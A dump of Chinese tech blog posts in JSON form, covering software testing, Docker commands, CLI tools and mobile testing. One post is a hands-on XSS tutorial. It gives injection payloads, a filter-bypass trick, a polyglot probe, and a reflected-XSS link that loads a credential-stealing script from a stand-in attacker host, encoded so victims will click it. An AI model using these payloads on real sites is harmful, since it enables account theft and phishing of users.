左右，直到新人们逐渐提高生产力。\n因此，踢走最近加入的人可能真的会提高工作效率。\n如果团队中有太多冲突，它可以起作用的其他原因是：移除与团队目标不一致的人可能会对团队有所帮助。\n如果团队中有太多人，那么沟通开销可能会大到足以阻碍生产力。在这种情况下，拆分团队可能效果很好（这在技术上与从项目中移除人员不同）。\n否则，移除人员只会降低团队在短期内的输出。\n无论如何，我只是在分享百慕大计划，因为谈论它总是很有趣。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B8%AD7%E4%B8%AA%E4%BB%A4%E4%BA%BA%E9%9C%87%E6%83%8A%E7%9A%84%E7%9C%9F%E7%9B%B8/","title":"软件测试中7个令人震惊的真相"},{"content":"一句话解释xss就是通过提供恶意的用户输入让浏览器执行恶意的JavaScript代码。\n最简单的例子 1 2 3 \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt; Welcome {your input} \u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; 这里页面希望你通过文本框输入自己名字，然后把你输入的名字展示出来。假如你输入的名字是:\u0026lt;script\u0026gt;alert('XSS')\u0026lt;/script\u0026gt;\n这时候浏览器将解析下面的html代码\n1 2 3 \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt; Welcome \u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; script标签里的js代码就被执行了，这就是一个最简单的xss。\n复杂一点点的例子 1 2 3 \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt; Welcome \u0026lt;input value=\u0026#34;{your input}\u0026#34;\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; 这时候如果你输入\u0026lt;script\u0026gt;alert('XSS')\u0026lt;/script\u0026gt; 那么将得到类似下面的结果\n1 2 3 \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt; Welcome \u0026lt;input \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; 因为script标签被包含在双引号里，浏览器会认为这是一个普通的字符串，所以不会执行js代码。不过如果你输入“\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert('XSS');\u0026lt;/script\u0026gt;” 那么你将会打开一个新的局面\n1 2 3 \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt; Welcome \u0026lt;input \u0026#34;\u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; input标签被强行闭合，script标签成功上位。这时候js代码又可以执行了。\n再来个例子 1 2 3 \u0026lt;script\u0026gt; document.getElementsByClassName(\u0026#39;name\u0026#39;)[0].innerHTML=\u0026#39;{input}\u0026#39;; \u0026lt;/script\u0026gt; 这个例子里我们要想办法在现有的代码中插入恶意的js代码，这里需要用到2点小知识\njs代码中;号可以结束一行语句 js代码中//表示后面的所有内容都是注释，可以被忽略掉 因此如果我们输入的是';alert('XSS');// 那么中间的alert语句是可以执行的\n1 2 3 \u0026lt;script\u0026gt; document.getElementsByClassName(\u0026#39;name\u0026#39;)[0].innerHTML=\u0026#39;\u0026#39;;alert(\u0026#39;XSS\u0026#39;);//\u0026#39; \u0026lt;/script\u0026gt; 前面的单引号被第1个单引号匹配并终结，后面的分号直接结束了这一句，而后面的那个单引号则被// 注释掉了，所以中间的alert代码是可以顺利执行的。\n还有例子 有时候页面会过滤掉一些危险的关键字，比如script标签，这时候可以试试构造下面的数据\n1 \u0026lt;sscriptcript\u0026gt;alert(\u0026#39;XSS\u0026#39;);\u0026lt;/sscriptcript\u0026gt; 当script标签被过滤掉之后，html代码如下\n1 \u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;);\u0026lt;/script\u0026gt; 恶意代码可以顺利执行。\n探针 如果每次见招拆招的话，那么攻击的效率是不太高的，这时候就可以试试下面的这种标准化探针字符串，如果页面存在一些基本的xss漏洞的话，下面的代码是可以被顺利执行的。\n1 jaVasCript:/*-/*`/*\\`/*\u0026#39;/*\u0026#34;/**/(/* */onerror=alert(\u0026#39;XSS\u0026#39;) )//%0D%0A%0d%0a//\u0026lt;/stYle/\u0026lt;/titLe/\u0026lt;/teXtarEa/\u0026lt;/scRipt/--!\u0026gt;\\x3csVg/\u0026lt;sVg/oNloAd=alert(\u0026#39;XSS\u0026#39;)//\u0026gt;\\x3e 我们可以使用自动化的工具在页面上所有可以输入的地方批量植入探针，这样就可以大规模高效率的进行攻击了。\n非持久化的xss 上面的例子是持久化的xss，简单来说就是需要把用户输入的内容保存到数据库里然后在页面进行回显，在现实中其实还有一种不需要持久化就进行xss攻击的例子。\n下面的例子来自维基百科。\n假设我们有一个搜索页面，该页面会回显url里的q参数，比如http://bobssite.org/search**?q=**\u0026lt;script\u0026gt;alert('xss');\u0026lt;/script\u0026gt; ****q参数后面的内容会回显到搜索框里，这样就可以把搜索结果简单的复制给其他人了。然而如果我们搜索的内容是带恶意脚本的script标签的话，在标签没有被转义的情况下，页面就会在回显的时候直接执行标签里的脚本了。\n这种方式还可以这样玩，比如\n1 http://bobssite.org/search?q=puppies\u0026lt;script%20src=\u0026#34;http://mallorysevilsite.com/authstealer.js\u0026#34;\u0026gt; 这样就可以执行authstealer.js脚本了，后面的事情有点复杂，就不过多描述了。\n最后为了不引起被害者的警觉，我们还可以把url中的内容编码一下\n1 http://bobssite.org/search?q=puppies%3Cscript%20src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E 这样被害人收到这样链接的时候就更有可能随手一点了。\n总结 xss攻击是最常见的前端攻击方式，一般情况下常用的前端框架都有安全机制尽量避免xss的发生，但武器库里有防身的工具，不见得所有的开发者都会熟练应用，因此xss漏洞始终是有可能出现的。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0xss%E6%94%BB%E5%87%BB/","title":"手把手教你xss攻击"},{"content":"项目源地址：https://github.com/wsargent/docker-cheat-sheet\ndocker的安装 略，windows上可以用docker desktop，具体可以参考官方文档。https://hub.docker.com/editions/community/docker-ce-desktop-windows\n安装之后用admin身份打开powershell，输入\n1 2 3 4 5 #Display the version of docker installed: docker version ##Pull, create, and run \u0026#39;hello-world\u0026#39; all in one command: docker run hello-world 容器相关 容器的生命周期 [docker create](https://docs.docker.com/engine/reference/commandline/create) 创建但未启动 [docker rename](https://docs.docker.com/engine/reference/commandline/rename/) 重命名容器 [docker run](https://docs.docker.com/engine/reference/commandline/run) 一个命令创建并启动容器 [docker rm](https://docs.docker.com/engine/reference/commandline/rm) 删除容器 [docker update](https://docs.docker.com/engine/reference/commandline/update/) 更新容器的资源限制 几个有用的点\n一般启动容器我们用docker run -td container_id, -t表示分配TTY session，-d表示后台运行并打印容器id docker run \u0026ndash;rm 用来运行容器后自动删除 docker run -v $HOSTDIR:$DOCKERDIR 用来做volume的映射 容器的启动和停止 [docker start](https://docs.docker.com/engine/reference/commandline/start) 运行容器 [docker stop](https://docs.docker.com/engine/reference/commandline/stop) 停止一个运行中的容器 [docker restart](https://docs.docker.com/engine/reference/commandline/restart) 重启容器 [docker pause](https://docs.docker.com/engine/reference/commandline/pause/) 暂停容器 [docker unpause](https://docs.docker.com/engine/reference/commandline/unpause/) 继续运行一个暂停了的容器 [docker wait](https://docs.docker.com/engine/reference/commandline/wait) 等待直到容器停止 [docker kill](https://docs.docker.com/engine/reference/commandline/kill) 发送SIGKILL信号给容器 [docker attach](https://docs.docker.com/engine/reference/commandline/attach) 连接运行中的容器 限制cpu和内存 1 docker run -it -c 512 agileek/cpuset-test 上面的命令限制了cpu使用率为50%，看起来很奇怪对不对？因为100%使用率用的参数是-c 1024，所以50%就是512\n我们还可以限制容器的内容使用\n1 docker run -it -m 300M ubuntu:14.04 /bin/bash 容器信息 [docker ps](https://docs.docker.com/engine/reference/commandline/ps) 展示运行中的容器 [docker logs](https://docs.docker.com/engine/reference/commandline/logs) 从容器中拿日志 [docker inspect](https://docs.docker.com/engine/reference/commandline/inspect) 展示容器的具体信息 [docker events](https://docs.docker.com/engine/reference/commandline/events) 从容器获得事件 [docker port](https://docs.docker.com/engine/reference/commandline/port) 展示容器的公共端口 [docker top](https://docs.docker.com/engine/reference/commandline/top) 展示容器中运行的进程 [docker stats](https://docs.docker.com/engine/reference/commandline/stats) 展示容器的资源使用情况 [docker diff](https://docs.docker.com/engine/reference/commandline/diff) 展示容器的file system中变更的文件 docker ps -a：展示所有的容器，包括运行中和已停止的\ndocker stats \u0026ndash;all： 展示所有的容器，不仅仅是运行中的容器的资源使用情况\n导入和导出 [docker cp](https://docs.docker.com/engine/reference/commandline/cp) 本地和容器进行文件和文件夹拷贝的方式 [docker export](https://docs.docker.com/engine/reference/commandline/export) 导出容器到STDOUT，一般是以压缩包的方式了 执行命令 docker exec -it foo /bin/bash 去容器中执行命令\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%8E%A8%E8%8D%90docker%E5%A4%87%E5%BF%98%E5%BD%95/","title":"推荐：Docker备忘录"},{"content":"微软今天发布了集成了GPT-4模型的office套件，从演示视频看，大概可以做这样一些事情\n输入指令自动做表 输入指令写邮件 输入指定自动做ppt，而且一做就是好多页，挺震撼的 稍微了解了一下原理，大概流程是\n用户发送prompt到office office获得用户授权访问用户的核心数据（email，聊天记录，会议信息，日程，联系人列表等） office整合用户信息修改prompt office将修改后的prompt发送到语言模型 office拿到语言模型的返回，并结合用户数据进行信息整合 office拿到整合后的信息和app的命令列表，进行自动化和信息展示 从原理可以看出office基本上把语言模型，目前也就是GPT-4当成了黑盒，这样应用软件层面其实不需要了解太多模型的细节和实现，只需要把模型当成语言理解器，内容生成器就好了。语言模型只负责理解用户的prompt和生成内容，office负责整合数据，调整prompt，以及我们今天讨论的话题，执行ui自动化。\n未来办公软件的形态 未来办公软件有很大概率会跟AI结合起来，他们大概会是\n有自己的主要形态和业务领域，比如邮件客户端，文字处理软件客户端，也就是有UI，有交互，有一些逻辑，跟现在的办公软件差不多 有AI辅助的能力，可以接受用户的prompt并进行修改和吟唱，然后调用大语言模型 有完善的UI自动化能力，根据大语言模型返回的内容自动化的进行操作，并展现给用户 所以简单来说，未来的办公软件将会调用AI，并执行自动化。\n那么未来的软件都会有ui自动化的接口 这个结论是水到渠成了，有ui自动化接口，那么就需要做ui自动化测试。所以对于一些泛化的办公软件开发团队来说，测试人员不仅要负责传统的功能测试，还需要调用ui自动化接口，保证接口的正确性，甚至是ui自动化的测试代码都可以成为大语言模型的无监督学习物料。\n更泛化的办公软件实现 也许未来会出现更加泛化办公软件或者是办公流程软件，可能包含这些部分\n结构化的用户以及组织数据，也就是用户的私有数据 用户prompt的预处理单元，负责接收用户prompt并join用户私有数据，形成新的输入给语言模型的prompt 大语言模型 指令执行hub，接收各种command，然后调用接口或者是ui自动化接口帮助人类进行工作 举个例子，未来可能会直接跟语音助手说：帮我预定一下10点的线上会议，邀请xx项目所有的相关人员参加，讨论一下xxx议题。这时候新的办公流程软件就可以直接调用语言模型进行内容理解和生成，拿到生成的内容后调用会议预定系统的api以及邮件或者im系统api，发送会邀和预定时间段。\n未来软件测试行为的变革 未来的测试保障工作可能就会变成\n面向AI也就是大语言模型的测试，join用户私有数据之后的prompt是否合理，是否有助于AI生成正确的内容？是否有足够的上下文帮助AI进行内容的生成？ 面向API的测试，UI自动化API和后端API是否可以正确的工作？ 面向数据的测试。用户数据的安全性和完整性是否可以保障？AI生成的内容里是不是有一些核心内容需要加入到用户的核心数据中去？ 点来点去。不是所有人都会使用AI助手，也不是所有情况下都需要使用AI，保障软件基本的GUI基本功能也是非常必要的 ","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%BE%AE%E8%BD%AF%E7%9A%84office365%E7%BB%99%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E5%B8%A6%E6%9D%A5%E7%9A%84%E5%8F%98%E9%9D%A9/","title":"微软的office365给软件测试带来的变革"},{"content":"最近新接手了一些项目，所以需要从0开始熟悉这些项目，这里正好跟大家分享一下相关的心得。\n特殊情况 由于项目是从别的团队跨国交接过来的，而且项目本身处在开发过程中，所以交接的时候会有一些困难。\n首先大家都很忙，没有办法正式交接，所以只能先旁敲侧击，尽量的阅读现有代码和文档，多看少问成了一种常态。\n其次交接项目其实在一定程度上是抢了别人的饭碗，所以整个过程要非常小心，要照顾对方团队的感受。\n如何开始 我是这样开始的。\n拿到代码库权限，这样可以直接看下代码，了解项目的技术栈，做到心里大致有数 拿到文档系统权限，先读一下存量文档 拿到监控系统权限，知道项目在监控些什么指标 找到对接人，有问题可以稍微问一下 所以看上去这个开始过程跟谈恋爱差不多，先通过各种方式去了解对方，然后再小心翼翼的进行接触。\n了解技术栈 接手的系统大概有十几个代码库，分为4-5个项目，其中一个核心项目基本上提供了其他项目所需要的依赖接口。我们暂且将这些系统命名为A/B/C/D。\n系统A:后端主要使用go实现，用到了go的全栈web框架和grpc；前端主要是react全家桶实现； 系统B:后端语言是python，用django实现；前端是nextjs写的； 系统C:后端django，前端nextjs； 系统D：纯前端项目，用nextjs实现； nextjs之前没有接触过，所以花了点时间看了看官方文档，因为大致是再react生态中，所以理解起来还是没有太大障碍的\n搭建开发环境 我一般通过搭建开发环境来熟悉系统之间的依赖，自己动手做一遍胜过万语千言。\n熟悉数据库结构 我一般喜欢从系统的持久化层去熟悉系统的大致逻辑，因为持久化反映了系统处理的结果，代码则反映了系统处理的过程，从结果去反推过程，尽管有点本末倒置，但数据的最终状态相对来说还是比较好去掌握的。\n接手的项目里有两个核心系统，A系统有100+表，B系统有60+表，我粗略的将这些表都过了一遍。过的思路是这样的\n首先在现有文档找实体图，如果有的话可以参考实体间的关系 没有实体图就自己找关系，比如外键，这反应了关系表之间的关联关系；一些实体没有外键的，但很明显是一些核心业务实体，比如电商里的订单信息之类的，这时候就需要找关联表，看看是不是有一些表记录了单独的关联关系。这样梳理一遍过后，就可以大致知道数据的结构，了解业务逻辑在数据库层面是如何表达的 画出实体之间的关系图，在图中出入线最多的实体大概率就是核心实体，也就是核心表 熟悉数据流向 数据库是数据最终的归宿，但数据在入库前和出库之后都可能会被加工，这些加工的过程就是业务逻辑的体现。那么如何去快速了解数据流向呢？我的经验是通过api。\n因为我们的系统是前后端分离的系统，所以业务逻辑的表达大部分都是通过api进行的。通过现有的api文档我们就可以知道系统有哪些功能，这些功能里会用到哪些数据表。把所有的接口都过一遍之后，我大概可以理解系统后端提供了哪些功能。另外交接的小哥给了我一份postman的collection，上面有大部分接口的测试用例，非常管用。\n如果没有文档的话只能通过代码去熟悉这个流程了。\n画出系统大致的架构图 数据库和数据流向偏向细节，在更宏观的层面上我喜欢画一些简单的部署架构图，注意不是逻辑架构图，来加深我对系统整体的理解。\n学会看线上监控 如果有线上监控，那么就要学会看线上监控指标。简单的监控可以分为两个层次\n基础监控。比如容器的健康度 服务监控。比如api的请求数量，耗时以及失败率等 如果没有监控的话，可以考虑将这个基础建设事项放到比较高的优先级去做\n学会查日志 日志可以给我们提供很多信息，在这些系统里，之前的开发者都使用了elk做日志存储，因为是相对标准的方案，交接的时候就会比较顺利。\n另外由于系统里用到了微服务架构，所以Distributed tracing机制也是必须的，这里就不展开了。\n空发布 空发布其实就是给代码加一些注释进行发布，尽管没有产生任何新的功能，不过空发布可以让我们了解系统是如何部署的，以及代码库的管理规范，比如哪个分支用来发布，如何做分支管理等。\n输出重构以及迁移思路 看代码的时候总会遇到一些觉得可以重构的地方的，这里可以先记下来，后面再去逐步推动改进。另外项目之前跑在之前开发者维护的k8s上，后面也要想办法把服务迁回来，这个思路可以先有，等完全熟悉了以后再动手去做。\n以上就是我对新项目熟悉的过程，不知道大家有什么建议没，欢迎评论哦。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%88%91%E6%98%AF%E6%80%8E%E4%B9%88%E7%86%9F%E6%82%89%E4%B8%80%E4%B8%AA%E6%96%B0%E9%A1%B9%E7%9B%AE%E7%9A%84/","title":"我是怎么熟悉一个新项目的"},{"content":"、\n命令行应用很多时候可以提升我们的工作效率，这里给大家推荐4款常见好用的命令行应用，希望对大家有所帮助。\nvim 大名鼎鼎的命令行编辑器，有时间的同学都可以尝试一下。\n说起来比较惭愧，当初学习vim的原因有两个。第一个是十多年前的室友表示vim这种工具的学习成本底，因为学会以后键位几十年不变，学一次用终生，性价比极高，尽管入门的时候学习曲线非常的陡峭，甚至有点反直觉。第二个理由是学习vim可以让我比较方便的在线上环境改代码，是的，你没看错，很多年前我们用php的时候确实做过线上调试和改代码的极限操作。\n如今随着运维的规范以及自动化发布的普及，线上改代码这种高危操作应该是被严令禁止了。不过使用vim仍然可以让你在任意机器ssh进远程服务器进行代码的编写和执行。配合上自定义的配置和第三方的插件，vim也是日常代码编辑的一个不错选择。\n另外很多编辑器都支持vim键位，比如atom，vscode，这会让你在写代码的时候更有如鱼得水的感觉。\ntmux tmux之前是运维同学的钟意之物，因为该工具可以\n分屏，将1个terminal分成多个部分 独立运行session，每个部分都是独立的会话，互不干涉 快照，任意时刻退出terminal，tmux都会保存当前会话，下一次可以无缝恢复 命令行的典型使用方式是，打开一个终端窗口（terminal window，以下简称\u0026quot;窗口\u0026quot;），在里面输入命令。用户与计算机的这种临时的交互，称为一次\u0026quot;会话\u0026quot;（session） 。 会话的一个重要特点是，窗口与其中启动的进程是连在一起的。打开窗口，会话开始；关闭窗口，会话结束，会话内部的进程也会随之终止，不管有没有运行完。 一个典型的例子就是，SSH 登录远程计算机，打开一个远程窗口执行命令。这时，网络突然断线，再次登录的时候，是找不回上一次执行的命令的。因为上一次 SSH 会话已经终止了，里面的进程也随之消失了。 为了解决这个问题，会话与窗口可以\u0026quot;解绑\u0026quot;：窗口关闭时，会话并不终止，而是继续运行，等到以后需要的时候，再让会话\u0026quot;绑定\u0026quot;其他窗口。\nTmux 就是会话与窗口的\u0026quot;解绑\u0026quot;工具，将它们彻底分离。 （1）它允许在单个窗口中，同时访问多个会话。这对于同时运行多个命令行程序很有用。 （2） 它可以让新窗口\u0026quot;接入\u0026quot;已经存在的会话。 （3）它允许每个会话有多个连接窗口，因此可以多人实时共享会话。 （4）它还支持窗口任意的垂直和水平拆分。\ntmux对于我来说的典型用法就是\n把一个窗口分成几块，小的窗口运行mysql，redis之类的服务 用一个窗口运行主服务，比如python的flask开发服务器 用最大的窗口来运行vim编辑器，做代码的编辑 这样任意时刻我退出ssh，上面的这些服务都会一直运行，下次我再ssh上去的话就可以无缝的继续工作了。\nhowdoi 大家可能有这样的经验，在写代码或者工作的时候经常会需要去各种搜索引擎查找一些信息，比如搜索python如何便利目录，go如何写文件并保存之类的。\n如果你的工作环境是标准的桌面环境，也就是有ui的，有浏览器的，这一切似乎不是什么问题。不过如果你只是ssh到服务器上做一些操作，如何在没有ui的环境下进行面向百度或者是google的编程和工作呢？\nhowdoi这个工具就解决了这个问题。敲命令howdoi，然后再是你需要搜索的内容，howdoi就可以很快的给你具体的信息。比如\n1 2 $ howdoi format date bash \u0026gt; DATE=`date +%Y-%m-%d` 再比如\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ howdoi print stack trace python \u0026gt; import traceback \u0026gt; \u0026gt; try: \u0026gt; 1/0 \u0026gt; except: \u0026gt; print \u0026#39;\u0026gt;\u0026gt;\u0026gt; traceback \u0026lt;\u0026lt;\u0026lt;\u0026#39; \u0026gt; traceback.print_exc() \u0026gt; print \u0026#39;\u0026gt;\u0026gt;\u0026gt; end of traceback \u0026lt;\u0026lt;\u0026lt;\u0026#39; \u0026gt; traceback.print_exc() $ howdoi convert mp4 to animated gif \u0026gt; video=/path/to/video.avi \u0026gt; outdir=/path/to/output.gif \u0026gt; mplayer \u0026#34;$video\u0026#34; \\ \u0026gt; -ao null \\ \u0026gt; -ss \u0026#34;00:01:00\u0026#34; \\ # starting point \u0026gt; -endpos 10 \\ # duration in second \u0026gt; -vo gif89a:fps=13:output=$outdir \\ \u0026gt; -vf scale=240:180 $ howdoi create tar archive \u0026gt; tar -cf backup.tar --exclude \u0026#34;www/subf3\u0026#34; www howdoi的安装方式很简单\n1 pip install howdoi 强烈推荐大家试一试，不需要频繁的从terminal切换到浏览器所带来的工作效率提升是非常明显的。\nhtop top相信大家都很熟悉了，htop其实是top的改进版本，是一款更加的简单实用的系统监控工具。\nhtop可以更加方便的查看cpu和内存的使用率，然后根据各种指标，比如cpu使用率，内存使用率等对进程进行实时排序，最关键的一点是支持鼠标点击排序，指哪打哪的舒适度比top还是好不少的。\nncdu 我的远程服务是最低配版本，这就意味着只有1核cpu，1g内存，以及20g的硬盘，而使用了一段时间以后这20g硬盘就会被占满，而且很难分析出哪些文件占用了大部分的空间。\n这时候就需要使用ncdu了，这个工具可以很方便扫描目录，并且按照文件大小进行排序，大目录一目了然，一些缓存路径就可以非常快速的找出来并删除掉了。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E4%BA%94%E6%AC%BE%E6%9C%80%E5%80%BC%E5%BE%97%E6%97%A5%E5%B8%B8%E4%BD%BF%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%BA%94%E7%94%A8/","title":"五款最值得日常使用的命令行应用"},{"content":"今天在github上看到一份测试同学的成长之路图谱，不敢独享，在这里给大家汇报一下。\n基本概念 首先明确几个基本概念\nSTLT: Software Testing Life Cycle 软件测试生命周期 SDLC:Software Develop Life Cycle 软件开发生命周期 TDD: Test Driven Development 测试驱动开发 RPA: Robotic Process Automation 过程自动化 必须掌握的基础能力 测试策略 白盒测试 灰盒测试 黑盒测试 测试类型 功能测试 单元测试 冒烟测试 集成测试 回归测试 健全性测试(sanity testing) 用户接受性测试(uat) 非功能性测试 负载测试 压力测试 安全测试 性能测试 上面的负载，压力以及性能测试在国内其实不怎么分，可以统一看作是性能测试，只不过测试策略不同而已。\nSTLC 管理工具 qTest TestLink（常用） Zephyr Testrail 项目管理工具 Jira(常用) Youtrack Trello Assembla 软件研发模型 V模型 敏捷模型：迭代式，较为常用 瀑布模型 深度手工测试技能 手工测试目前看来还是软件测试工程师的核心能力，优秀的手工测试能力可以让你的职业生涯发展更加平滑。\n做一个数据驱动的测试人员可以节约你的时间精力并让你的质量改进行为更加有效。\nTDD 先写用例，开发的过程实际上就是不停的去实现这些用例。\n测试计划定义 测试范围 测试资源 测试策略 如何进行测试 测试用例及场景(必须掌握) 测试用例设计是测试同学的主要工具，基本上就是把用户的行为转换为测试用例。\n测试报告 上级领导最关注的部分。\n包含了软件/系统在修改或者发布后的真实表现。\n兼容性 作为测试人员，你必须在测试计划优先级之上具有兼容性，毕竟世界上唯一不变的就是变化。\nVerification \u0026amp; Validation Verification: 我们是用正确的方式去开发产品么？ Validation: 我们是在开发正确的产品么？ 一些建议 不要相信没有失败的测试代码。 了解软件测试，不盲目自动化； 我个人将自动化分类为处理冗余任务的有效方法。 确保正确设计您的测试标准，以后，您可以自动化实现先前的测试标准。 自动化不只是记录手动编写的测试用例用代码以一种易读和重用的方式翻译出来。 确保您的测试代码实际上正在测试某些东西。 您的测试代码不需要进行测试。 http状态中，200〜OK并不总是可以的； 在测试过程中，不要仅依靠服务器状态，未经授权的API调用会获得200的状态，这会威胁到您的软件安全。 需要大图的同学请在对话框直接回复:线路图\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%85%88%E6%94%B6%E8%97%8F-%E6%B5%8B%E8%AF%95%E5%90%8C%E5%AD%A6%E7%9A%84%E6%88%90%E9%95%BF%E4%B9%8B%E9%81%93from-github/","title":"先收藏 测试同学的成长之道—from github"},{"content":"今天在国外论坛看到了个很有意思的发帖，有人提问：线上发现了bug该如何处理。\n我知道大家已经问过很多次类似的问题了，不过工作还是很让我失望。我在生产环境上漏掉了1个很明显的bug没测出来，我想知道你们是怎么处理这种情况的。我的项目经理发现了这个bug。\n大家的回答其实很暖心的。下面是一些高赞回答。\n这就意味着你们在单元测试，集成测试和功能测试以及自动化测试的阶段就已经漏掉了这个问题，希望你们有做这些。其实开发跟你们的感受一下，我就是个开发，我一直为我写的bug感到抱歉，我认为责任应该由整个team承担。\n事情都发生了，先承认错误。确定是否真的有测试遗漏，并在未来的发布中加入这个用例。\n好的devops team需要有零责备文化（https://www.releaseteam.com/the-importance-of-a-zero-blame-culture-in-devops/），好的软件质量交付需要团队的努力。\n这就是QA当下生存现状。如果你能忍受压力持续进步，那么你会成为一个好的QA的。\n你并没有搞砸，是流程的锅。扔给你点资料去学习吧https://www.amazon.com/Antifragile-Things-That-Disorder-Incerto/dp/0812979680。\n总的看来大家的观点还是开明的，比较包容，不过事实上大家的看法是一回事，但最后处理问题的方式又是另外一回事了。假如发生了一个很严重的线上事故，还好有别人背锅，你是安全的，这时候你心里肯定是同情和理解，觉得qa其实有点无辜，是流程的锅，觉得需要整个团队努力一下以便改进交付质量，但是如果你是直接或相关责任人，处罚落到了你头上，你大概率就不会这么宽容的看问题了。\n我的观点是发现线上问题不可怕，能不能迅速发现问题和迅速修复问题才是关键，而这两点光靠qa负重前行是无法得到根本上的改善的。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E7%BA%BF%E4%B8%8A%E5%8F%91%E7%8E%B0%E4%BA%86bug%E8%AF%A5%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86/","title":"线上发现了bug该如何处理"},{"content":"Guide to Mobile Testing\n移动应用已经风靡全球，在移动互联网如此普及的今天，移动测试的重要性不言而喻。个人认为移动应用现在是大部分互联网公司的主要业态，在竞争激烈的现时，移动应用的质量可能会影响某个产品的成败与存亡，在去测试化思潮如此普遍的今天，移动端应用应该是最不可能砍掉测试人员的。因为\n移动应用的质量是第一大事 竞争越激烈，好的质量越重要 测试移动应用的效率目前还是偏低，用高薪的开发人员去兼任测试职能有点得不偿失 移动端更新成本相对较高，测试充分再发出去才能尽可能地规避更新应用进行bugfix的风险 诚然，有些公司在推进去测试化，但那些公司可能是\n所在行业垄断性质明显，没有其他公司可以进行正面竞争，比如微软 公司和用户对线上问题忍耐度相对较高，应用形态相对单纯，试错成本相对较低，比如之前的头条 行业已过高速增长期但存量竞争激烈，产品基本处于维护阶段，不需要投入太多的开发和测试资源，比如腾讯的某些产品 从这里开始就是翻译了，原文地址在：https://medium.com/@iamfaisalkhatri/guide-to-mobile-testing-d0dd2d9b59f1\n所以大部分情况下，移动端的测试以及质量提升是需要专职测试人员进行负责和统筹的，所以不必焦虑。相反，了解一些基本的移动端测试知识是一件较为必要的事情。\n质量是关键\n我们需要检查所有内容以及所有可能的排列和组合，以免出现任何bug。由于移动设备也存储了最终用户的个人数据，因此有必要对安全性和数据完整性进行检查。\n测试应用程序的性能同样重要，因为如今人们对应用程序的速度更感兴趣。如果功能能用，但应用响应时间过长，可能无法吸引用户。因此，应用程序的性能测试也是需要考虑的重要因素。\n谈到测试移动应用程序，我认为我们应该首先弄清楚测试策略，因为它可以帮助我们分解测试阶段并进行高质量的测试，并帮助我们避免漏测一些重要内容。\n定义测试策略 首先我们需要弄清楚移动应用的类型\n原生应用：离线可以直接用安装包进行安装，一般情况下可以在应用商店下载 移动web应用：比如h5应用，基本是用html+css+js进行开发的，可能长得跟原生应用很像，但基本上不是一回事 混合应用：既有原生也有移动web的应用，一般情况下对开发人员比较友好，毕竟web应用比原生应用开发要容易一点点 我们以混合应用为例在说明一下如何定义我们的测试策略，在进入细节之前，我们先来了解一下测试类型的相关知识。\n测试类型 理想情况下，虑到混合应用程序，我认为应该考虑以下测试类型\n功能测试。 性能测试 安全测试 可用性测试 UI/UX 测试 何时以及如何开始测试 由于我们处于当今软件世界虔诚地遵循敏捷的时代，因此最好尽早开始测试。\n测试应该在软件开发生命周期的每个阶段进行，而不仅仅是在功能完全开发时进行。\n话虽如此，请始终确保开发人员正在编写单元测试。还应涵盖集成和服务层测试。只写测试没有帮助，代码覆盖率报告应该显示单元测试覆盖率至少大于 80%，如果有可能的话，可以逐渐增加到 100%。有一条流水线可以帮助我们轻松监控生命周期并在每个阶段采取纠正措施，这很好。因此，除非构建是绿色的，否则继续进行测试并尽快进行所需的修复是不好的。\n测试计划 有一个测试计划是很好的，因为它会更容易检查所有的测试活动，所以我们不会遗漏任何东西，顺利地执行测试并提供高质量的输出。\n第一个也是最重要的情况是用户是否能够使用 PlayStore/App Store 成功安装应用程序。\n接下来，是检查安装成功后应用程序是否正确打开。\n以下是我们在测试移动应用程序时需要注意的所有测试活动的一般列表：\n搞清楚在预期发布应用程序的地区广泛使用的移动操作系统平台。 根据从第 1 步得出的结果 — 检查哪些都是该地区流行的移动设备，并相应地列出所有流行的设备。 从第 2 步生成的列表中，取出前 5 个设备并考虑将它们用于测试目的。此外，请确保您采用大屏幕和小屏幕尺寸的组合，以便更好的去覆盖ui/ux的检查项。 考虑操作系统版本也很重要，例如，对于之前在上述步骤中考虑的地区和操作系统，iOS 版本 14 和 15 是该地区流行的版本。因此，在这种情况下，请确保您在 iOS 版本 14 和 15 上进行测试。大多数时候漏掉的另一件重要的事情是最低版本支持。因此，如果您的应用程序支持 iOS 版本 12 作为最低版本，请确保在大小屏幕设备上对 iOS 版本12进行一轮充分的回归测试。根据我的经验，大约 1-2% 的一些讨厌的 bug 来自这里。 